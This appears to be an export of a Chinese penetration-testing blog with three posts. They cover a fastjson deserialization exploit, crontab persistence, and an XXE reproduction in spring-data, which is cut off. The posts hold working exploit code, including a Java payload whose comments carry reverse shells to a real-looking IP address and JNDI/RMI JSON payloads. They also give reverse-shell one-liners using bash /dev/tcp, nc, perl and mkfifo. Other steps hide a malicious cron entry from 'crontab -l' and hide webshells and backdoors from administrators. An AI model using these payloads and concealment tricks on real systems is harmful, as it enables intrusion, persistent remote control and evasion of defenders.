                       <span class="token comment" spellcheck="true">//String[] commands = {"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMjQuMTQ2LjIwNC84NTUwIDA+JjE=}|{base64,-d}|{bash,-i}"};</span>
            <span class="token comment" spellcheck="true">//String[] commands = {"/bin/bash", "-c", "'/bin/bash -i >&amp; /dev/tcp/118.24.146.204/8550 0>&amp;1'"};</span>
            Process    pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;>/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">//System.out.println(commands[0]);</span>
            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
        fastjson e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">fastjson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640450186979.jpg" alt="-w1006"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据分析，这次遇到的fastjson漏洞不是最近1.2.47版本的，而是之前1.2.24<br>此处反编译的<br>FastJson_JdbcRowSetImpl_JNDI_RMIServer如下<br>创建rmi（java 本身的rpc框架） </p>
<pre class=" language-java"><code class="language-java">
<span class="token keyword">import</span> cn<span class="token punctuation">.</span>com<span class="token punctuation">.</span>topsec<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>FastJson_JdbcRowSetImpl_JNDI_RMIServer<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>AlreadyBoundException<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span>
<span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>NamingException<span class="token punctuation">;</span>
<span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Reference<span class="token punctuation">;</span>


<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FastJson_JdbcRowSetImpl_JNDI_RMIServer</span>
<span class="token punctuation">{</span>
  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span>String httpServer<span class="token punctuation">,</span> <span class="token keyword">int</span> rmiPort<span class="token punctuation">,</span> String hostName<span class="token punctuation">)</span> <span class="token keyword">throws</span> AlreadyBoundException<span class="token punctuation">,</span> RemoteException<span class="token punctuation">,</span> NamingException <span class="token punctuation">{</span>
    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"* Open JNDI-RMI Listener on "</span> <span class="token operator">+</span> rmiPort<span class="token punctuation">)</span><span class="token punctuation">;</span>
    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n [*] HTTPSERVER = "</span> <span class="token operator">+</span> httpServer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">" [*] RMIPORT = "</span> <span class="token operator">+</span> rmiPort<span class="token punctuation">)</span><span class="token punctuation">;</span>
System<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"java.rmi.server.hostname"</span><span class="token punctuation">,</span> hostName<span class="token punctuation">)</span><span class="token punctuation">;</span>
    Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span>rmiPort<span class="token punctuation">)</span><span class="token punctuation">;</span>
    Reference reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"CommandObject"</span><span class="token punctuation">,</span> <span class="token string">"CommandObject"</span><span class="token punctuation">,</span> httpServer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    ReferenceWrapper referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>
    registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"Object"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> NamingException<span class="token punctuation">,</span> AlreadyBoundException <span class="token punctuation">{</span>
    String httpServer <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> rmiPort <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    String<span class="token punctuation">[</span><span class="token punctuation">]</span> httpServerHost <span class="token operator">=</span> httpServer<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    String hostName <span class="token operator">=</span> httpServerHost<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    httpServer <span class="token operator">=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> httpServer <span class="token operator">+</span> <span class="token string">"/"</span><span class="token punctuation">;</span>

    <span class="token function">start</span><span class="token punctuation">(</span>httpServer<span class="token punctuation">,</span> rmiPort<span class="token punctuation">,</span> hostName<span class="token punctuation">)</span><span class="token punctuation">;</span>
    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n [*] Payload���"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">" [+] {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://"</span> <span class="token operator">+</span> httpServerHost<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> rmiPort <span class="token operator">+</span> <span class="token string">"/Object\",\"autoCommit\":true}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n [*] enjoy���"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="创建RMI-Server"><a href="#创建RMI-Server" class="headerlink" title="创建RMI Server"></a>创建RMI Server</h3><pre><code>package com.luckyqiao.rmi;

import java.io.IOException;
import java.rmi.AlreadyBoundException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

public class RMIServer {

    public static void main(String[] args) {

        RemoteHello remoteHello = new RemoteHelloImpl();
        try {
            RemoteHello stub = (RemoteHello) UnicastRemoteObject.exportObject(remoteHello, 4000); //导出服务，使用4000端口
            Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 8000); //获取Registry
            registry.bind(&quot;hello&quot;, stub); //使用名字hello，将服务注册到Registry
        } catch (AlreadyBoundException | IOException e) {
            e.printStackTrace();
        }

    }
}
</code></pre><p>参照sky 的rmi server 进行修改如下</p>
<pre class=" language-java"><code class="language-java">
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper<span class="token punctuation">;</span>
<span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Reference<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">/**
 * @author sky
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">rmiserver</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Reference reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"CommandObject"</span><span class="token punctuation">,</span>
                <span class="token string">"CommandObject"</span><span class="token punctuation">,</span><span class="token string">"http://localhost:80/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ReferenceWrapper referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>
        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"Exploit"</span><span class="token punctuation">,</span>referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre>
<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637303551208.jpg" alt="-w1227"></p>
<p>整理下 利用方式<br>【1】首先准备一个 RMI Server<br>【2】开启对应的httpserver<br>【3】CommandObject.class 执行文件<br>【4】利用poc</p>
<h3 id="1-2-47-与1-2-24的区别"><a href="#1-2-47-与1-2-24的区别" class="headerlink" title="1.2.47 与1.2.24的区别"></a>1.2.47 与1.2.24的区别</h3><p>在该漏洞情况下 poc与1.2.47 稍有区别<br>1.2.24 poc如下</p>
<pre><code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:389/obj&quot;,&quot;autoCommit&quot;:true}
</code></pre><p>根据poc来看 是进行了黑名单的绕过，在1.2.24的漏洞情况下，将”com.sun.rowset.JdbcRowSetImpl”进行了黑名单的处理，但在1.2.47中又给绕过了</p>
<pre><code>{
    &quot;name&quot;: {
        &quot;@type&quot;: &quot;java.lang.Class&quot;,
        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;
    },
    &quot;x&quot;: {
        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
        &quot;dataSourceName&quot;:&quot;rmi://ip:port/Exploit&quot;,
        &quot;autoCommit&quot;: true
    }
}
</code></pre><h3 id="绕过分析-待续"><a href="#绕过分析-待续" class="headerlink" title="绕过分析-待续"></a>绕过分析-待续</h3><h2 id="fastjson黑名单"><a href="#fastjson黑名单" class="headerlink" title="fastjson黑名单"></a>fastjson黑名单</h2><p>在1.2.48的补丁中将 “java.lang.Class”给进行拉黑处理了<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637315127442.jpg" alt="-w748"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">fastjson-blacklist</a><br><a href="https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE" target="_blank" rel="noopener">FastJson-JdbcRowSetImpl</a><br><a href="https://blog.spoock.com/2018/11/07/java-reverse-shell/" target="_blank" rel="noopener">使用java反弹shell</a><br><a href="https://www.03sec.com/3240.shtml" target="_blank" rel="noopener">fastjson =&lt; 1.2.47 反序列化漏洞浅析</a></p>
]]></content>
      
        <categories>
            
            <category> Web渗透 </category>
            
            <category> 漏洞学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> fastjson </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[计划任务]]></title>
      <url>/2019/07/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/</url>
      <content type="html"><![CDATA[<p>计划任务<br>[TOC]</p>
<h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><p>linux 计划任务 结合 NC执行后门</p>
<h2 id="查看crontab执行情况"><a href="#查看crontab执行情况" class="headerlink" title="查看crontab执行情况"></a>查看crontab执行情况</h2><p>查看其日志的方式</p>
<pre><code>tail -f /var/log/cron 
</code></pre><h2 id="crontab-命令"><a href="#crontab-命令" class="headerlink" title="crontab 命令"></a>crontab 命令</h2><pre><code>Usage:
 crontab [options] file
 crontab [options]
 crontab -n [hostname]

Options:
 -u &lt;user&gt;  define user
 -e         edit user&#39;s crontab
 -l         list user&#39;s crontab
 -r         delete user&#39;s crontab
 -i         prompt before deleting
 -n &lt;host&gt;  set host in cluster to run users&#39; crontabs
 -c         get host in cluster to run users&#39; crontabs
 -s         selinux context
 -x &lt;mask&gt;  enable debugging

Default operation is replace, per 1003.2
</code></pre><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><pre><code>[root@VM_0_2_centos ~]# cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
</code></pre><p>配置文件为/etc/crontab<br>存放执行的crontab脚本文件的路径为/etc/cron.d<br>存放每个用户的crontab任务的目录在debian系统中一般为/var/spool/cron/crontabs，centos系统中一般为/var/spool/cron<br><img src="/2019/07/11/内网渗透/计划任务/15624920243890.jpg" alt="-w293"></p>
<h2 id="利用crontab-反弹shell"><a href="#利用crontab-反弹shell" class="headerlink" title="利用crontab 反弹shell"></a>利用crontab 反弹shell</h2><p>常见的通过corntab反弹shell方法</p>
<h3 id="bash-反弹shell"><a href="#bash-反弹shell" class="headerlink" title="bash 反弹shell"></a>bash 反弹shell</h3><p>测试设备<br>A：服务端 centos<br>B：客户端 ubuntu</p>
<pre><code>bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1
</code></pre><h4 id="命令解析"><a href="#命令解析" class="headerlink" title="命令解析"></a>命令解析</h4><pre><code>参数    描述
-c string    从string中读取命令并处理他们
-r     启动限制性shell,限制用户在默认目录下活动
-i    启动交互性shell,允许用户输入
-s    从标准输入读取命令
</code></pre><p>即启用交互式shell</p>
<pre><code>linux shell下常用的文件描述符是：
1.  标准输入   (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； 
2.  标准输出   (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； 
3.  标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;
</code></pre><p>其中 “&gt;&amp;” 和 “&amp;&gt;”的效果一样都是将标准错误输出重定向到标准输出，即和”&gt; xxx 2&gt;&amp;1”是一样的。<br>这里的”&amp;”  类似于取地址符<br><img src="/2019/07/11/内网渗透/计划任务/15624937292291.jpg" alt="-w1435"><br>此处 客户端的输入和输出都在服务端上展示，服务端无法直接输入<br><img src="/2019/07/11/内网渗透/计划任务/15624942091590.jpg" alt="-w1438"></p>
<p>在man bash 里面解释为<br><img src="/2019/07/11/内网渗透/计划任务/15624986811057.jpg" alt="-w709"><br>同理   “n&lt;&amp;word” 是word复制给n， “n&gt;&amp;word”是把word复制给n<br>“0&gt;&amp;1”就是把 0对应的设备改成的1对应的设备，那也就是socket。这就表明了 stdin就是从socket中读取数据，然后再执行命令，把bash的命令行返回内容通过stdout发到socket。<br><img src="/2019/07/11/内网渗透/计划任务/15624989415170.jpg" alt="-w712"></p>
<p>/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/</p>
<h3 id="crontab-反弹-shell"><a href="#crontab-反弹-shell" class="headerlink" title="crontab 反弹 shell"></a>crontab 反弹 shell</h3><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><p>crontab -e<br>选择常见编辑器后，写入执行命令</p>
<pre><code>*/1 * * * * bash -i &amp;&gt; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1
*/1 * * * * bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1
</code></pre><p>以及段师傅的</p>
<pre><code>/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#39;
</code></pre><p>别忘了重启</p>
<pre><code>/etc/init.d/cron restart
</code></pre><p>在ubuntu中 踩了个大坑，这条命令在centos中可以执行，但是在ubuntu中不行。<br>检查日志 “/var/log/syslog” 发现计划任务执行了，但是结果没建立连接<br><img src="/2019/07/11/内网渗透/计划任务/15625034967756.jpg" alt="-w888"><br><img src="/2019/07/11/内网渗透/计划任务/15625035284231.jpg" alt="-w887"></p>
<p>修改下软连接</p>
<pre><code>ln -sf bash /bin/sh
</code></pre><p><img src="/2019/07/11/内网渗透/计划任务/15625045861245.jpg" alt="-w533"></p>
<p><img src="/2019/07/11/内网渗透/计划任务/15625054790101.jpg" alt="-w530"><br><img src="/2019/07/11/内网渗透/计划任务/15625062607262.jpg" alt="-w1300"></p>
<p>推测是原ubuntu 版本的bin/sh 软连接 连接到dash<br>修改后的软连接：<br><img src="/2019/07/11/内网渗透/计划任务/15625069478372.jpg" alt="-w653"><br>这里/bin/sh软连接是sh -&gt; dash 然后rbash -&gt; bash<br>关键问题是 bash和dash的区别</p>
<pre><code>从Ubuntu 6.10开始，默认使用dash(theDebian Almquist Shell)而不是bash(the GNUBourne-Again Shell). 但Login Shell还是bash. 原因是dash更快、更高效，而且它符合POSIX规范。Ubuntu在启动的时候会运行很多shell脚本，使用dash可以加快启动速度
</code></pre><h4 id="bash和dash在-bin-sh-使用中的区别-待续"><a href="#bash和dash在-bin-sh-使用中的区别-待续" class="headerlink" title="bash和dash在/bin/sh  使用中的区别-待续"></a>bash和dash在/bin/sh  使用中的区别-待续</h4><p>将该ubuntu中的/bin/sh 软连接改回到dash，查看该问题报错</p>
<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p>在centos下可以使用</p>
<pre><code>*/1 * * * * nc -e /bin/sh ip port
</code></pre><p>别忘了重启</p>
<pre><code>service crond restart
</code></pre><p><img src="/2019/07/11/内网渗透/计划任务/15625077559555.jpg" alt="-w892"></p>
<pre><code>*/1 * * * * perl -e &#39;use Socket;$i=&quot;vps.ip&quot;;$p=8989;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
</code></pre><h1 id="隐藏计划任务"><a href="#隐藏计划任务" class="headerlink" title="隐藏计划任务"></a>隐藏计划任务</h1><p>在使用计划任务入侵的时候，可以简单的隐藏下计划任务，以便于不那么容易被发现</p>
<pre><code>(crontab -l;printf &quot;*/1 * * * *  /usr/bin/nc ip 8550 -e /bin/sh;\rno crontab for `whoami`%100c\n&quot;)|crontab -
</code></pre><p>这个时候直接用crontab -l 输出的时候是直接显示no crontab for 当前用户。</p>
<p>注意这里有一个坑点，osx系统中的nc 没有-e 参数（在Linux的大部分发行版中都默认编译了nc，但也许是出于安全考虑，发行版中默认编译的nc往往没有-e选项(没有define一个<br>GAPING_SECURITY_HOLE常量)，也就是说我们不能通过-e选项绑定目标的shell，使得我们在利用上受到限制，但这种情况下是不是就），这里可以看看mail文件”/var/mail/name”里面的报错<br><img src="/2019/07/11/内网渗透/计划任务/15626424045783.jpg" alt="-w657"></p>
<h2 id="nc-缺少-e-参数的解决方式"><a href="#nc-缺少-e-参数的解决方式" class="headerlink" title="nc 缺少 -e 参数的解决方式"></a>nc 缺少 -e 参数的解决方式</h2><h3 id="dev-tcp"><a href="#dev-tcp" class="headerlink" title="dev/tcp"></a>dev/tcp</h3><p>在缺少 -e得时候，可以使用bash dev/tcp/ip/port（在有/dev/tcp的bash的前提下）<br><img src="/2019/07/11/内网渗透/计划任务/15631095532134.jpg" alt="-w563"></p>
<p><img src="/2019/07/11/内网渗透/计划任务/15631095859841.jpg" alt="-w1112"></p>
<h3 id="mknod-FIFO"><a href="#mknod-FIFO" class="headerlink" title="mknod FIFO"></a>mknod FIFO</h3><pre><code>mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f
</code></pre><p><img src="/2019/07/11/内网渗透/计划任务/15631099611608.jpg" alt="-w1122"><br>mkfifo</p>
<p>或者</p>
<pre><code>mknod /tmp/backpipe p ;/bin/sh 0&lt; /tmp/backpipe | nc ip 443 1&gt; /tmp/backpipe
</code></pre><p><img src="/2019/07/11/内网渗透/计划任务/15631105445990.jpg" alt="-w1136"></p>
<h2 id="隐藏文件-文件夹"><a href="#隐藏文件-文件夹" class="headerlink" title="隐藏文件/文件夹"></a>隐藏文件/文件夹</h2><p>Linux/Unix 藏文件和文件夹<br>Linux/Unix 下想藏 Webshell 或者后门什么的，可以利用一下隐藏文件夹和文件。</p>
<p>方法一<br>比如创建一个名字开头带 . 的 Webshell 或者文件夹，默认情况下是不会显示出来的，浏览器访问的时候加点访问就行。（查看方法：ls -a）</p>
<pre><code>touch .webshell.php 创建名字为 .webshell.php 的文件
mkdir .backdoor/ 创建名字为 .backdoor 的文件夹
</code></pre><p>终极方法<br>在管理员喝多了或者脑子转不过来的情况下，是绝对不会发现的！至少我用了这么久是没几个发现的。<br>是文件的话浏览器访问直接输 … 就行，目录同理。</p>
<pre><code>touch … 创建名字为 … 的文件
mkdir … 创建名字为 … 的文件夹

</code></pre><h2 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h2><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>  <a href="https://m3lon.github.io/2019/03/18/解决ubuntu-crontab反弹shell失败的问题/" target="_blank" rel="noopener">解决ubuntu-crontab反弹shell失败的问题</a></p>
<p>   <a href="https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/" target="_blank" rel="noopener">Netcat without -e? No Problem!</a></p>
]]></content>
      
        <categories>
            
            <category> 内网渗透 </category>
            
            <category> 计划任务 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> 计划任务 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XXE实例及应用3]]></title>
      <url>/2019/07/08/Web%E6%B8%97%E9%80%8F/XXE/XXE%E5%AE%9E%E4%BE%8B%E5%8F%8A%E5%BA%94%E7%94%A83/</url>
      <content type="html"><![CDATA[<p>Java - XXE</p>
<h1 id="Java-XXE"><a href="#Java-XXE" class="headerlink" title="Java - XXE"></a>Java - XXE</h1><p>XXE在Java 代码中的漏洞示例</p>
<h2 id="JAVA常见XXE漏洞写法案例"><a href="#JAVA常见XXE漏洞写法案例" class="headerlink" title="JAVA常见XXE漏洞写法案例"></a>JAVA常见XXE漏洞写法案例</h2><h3 id="spring-data-XMLBean-XXE复现分析"><a href="#spring-data-XMLBean-XXE复现分析" class="headerlink" title="spring-data-XMLBean XXE复现分析"></a>spring-data-XMLBean XXE复现分析</h3><h4 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h4><p>【1】下载环境</p>
<pre><code>git clone https://github.com/spring-projects/spring-data-examples.git
</code></pre><p>【2】下载安装maven并配置好环境变量<br>因为这里的新版本已经对次做了修复，所以这里的版本改为 2.0.5</p>
<pre><code>        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.data&lt;/groupId&gt;
            &lt;artifactId&gt;spring-data-commons&lt;/artifactId&gt;
            &lt;version&gt;2.0.5.RELEASE&lt;/version&gt;
        &lt;/dependency&gt;
</code></pre><p>【3】配置好环境变量后，进入对应的web/projection 打包运行</p>
<pre><code>mvn package
</code></pre><p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613639506348.jpg" alt="-w1133"></p>
<h4 id="部署运行"><a href="#部署运行" class="headerlink" title="部署运行"></a>部署运行</h4><p>进入对应目录搭建运行</p>
<pre><code>java -jar spring-data-web-projection-2.0.0.BUILD-SNAPSHOT.jar
</code></pre><p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613640157733.jpg" alt="-w754"></p>
<h4 id="poc复现"><a href="#poc复现" class="headerlink" title="poc复现"></a>poc复现</h4><p>构造post请求<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613640647871.jpg" alt="-w1318"><br>比较奇怪的一点是，正常的xxe请求 任意文件读取 都应该是 file:///<br>这里直接执行也行<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613641950150.jpg" alt="-w1094"></p>
<pre><code>
注意  这里的content-type 类型，得支持，改为 application/xml
</code></pre><p>xxe支持的content-type fuzz一下<br>在位置中application/xhtml+xml 与 application/xml 的效果是一样的<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613841433359.jpg" alt="-w1016"></p>
<pre><code>注
Accept代表发送端（客户端）希望接受的数据类型。 
比如：Accept：text/xml; 
代表客户端希望接受的数据类型是xml类型

Content-Type代表发送端（客户端|服务器）发送的实体数据的数据类型。 
比如：Content-Type：text/html; 
代表发送端发送的数据格式是html。
</code></pre><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>从该位置可以知道漏洞位置是在 firstname和lastname的接收处理，所以跟踪下idea下的该函数。<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613896457891.jpg" alt="-w1283"><br>该maven项目demo中就application和userController 两个函数，从主函数跟踪。<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613906870820.jpg" alt="-w911"><br>可以看到post请求中的user.getFirstname(),user.getLastname() 方法<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613907763911.jpg" alt="-w404"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613909426094.jpg" alt="-w805"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15613909700427.jpg" alt="-w881"></p>
<p>跟踪下 会发现，在调用responseEntity的时候就已经读取文件了<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15614750470756.jpg" alt="-w932"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/15614751204095.jpg" alt="-w943"></p>
